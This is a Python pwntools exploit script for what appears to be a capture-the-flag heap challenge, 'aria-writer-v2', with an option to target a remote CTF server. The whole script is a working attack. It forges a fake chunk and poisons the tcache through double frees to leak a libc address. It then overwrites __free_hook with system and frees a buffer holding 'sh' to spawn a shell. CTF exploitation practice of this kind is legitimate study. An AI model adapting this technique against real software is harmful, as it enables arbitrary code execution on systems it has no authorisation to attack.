from pwn import *

e = ELF("./aria-writer-v2")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("pwn.hsctf.com", 2222)
else:
  p = process(e.path)

def alloc(size=0x18, payload="AAAA"):
  p.sendlineafter(">", "1")
  p.sendlineafter(">", str(size))
  p.sendafter(">", payload + ("" if len(payload) == size else "\n"))
    
def free():
  p.sendlineafter(">", "2")

p.sendlineafter(">", p64(0x91) + p64(e.symbols["curr"] + 0x10) + "A" * 0x80 + p64(0x21))

for i in range(0x21 - 4):
  alloc(0x10)

alloc(0x88)

free()
free()

alloc(0x88, p64(e.symbols["curr"] + 0x10))
alloc(0x88, p64(e.symbols["curr"] + 0x10))
alloc(0x88, p64(e.symbols["curr"] + 0x10))

free()

p.sendlineafter(">", "3")
p.recvuntil("o: :")
libc_base = u64(p.recvline()[8:16]) - 0x7f2135d5bca0 + 0x00007f2135970000
print("{:#x}".format(libc_base))

alloc(0x38)

free()
free()

alloc(0x38, p64(libc_base + libc.symbols["__free_hook"] - 0x8))
alloc(0x38)
alloc(0x38, "sh".ljust(8, "\x00") + p64(libc_base + libc.symbols["system"]))

free()


p.interactive()
